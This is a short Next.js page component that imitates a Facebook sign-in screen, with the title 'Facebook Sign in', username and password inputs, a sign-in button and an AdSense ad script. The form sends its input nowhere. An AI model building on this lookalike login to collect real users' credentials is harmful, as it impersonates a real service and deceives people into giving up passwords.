import  Styles1 from "./page.module.css";
import type { Metadata } from "next";
export const metadata: Metadata = {
  title: "Facebook Sign in",
  description: "",
};
function Home1() {
    return(
      <>
      <head>
            <script
        async
        src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-8865069421209568"
        crossOrigin="anonymous" // Added crossOrigin for better practice
      ></script>
        </head>
      <div className={Styles1["container_box1"]}>
                    <h1>Facebook</h1>
                    <br/>
                    <br/>
                    <form>
                    <input required  type="text" placeholder="username"/>
                    <br/>
                    <br/>
                    <input required id="password" type="password" placeholder="password"/>
                    <br/>
                    <br/>
                    <button>Sign_in</button>
                    </form>
      </div>
      </>
    )
 }
export default Home1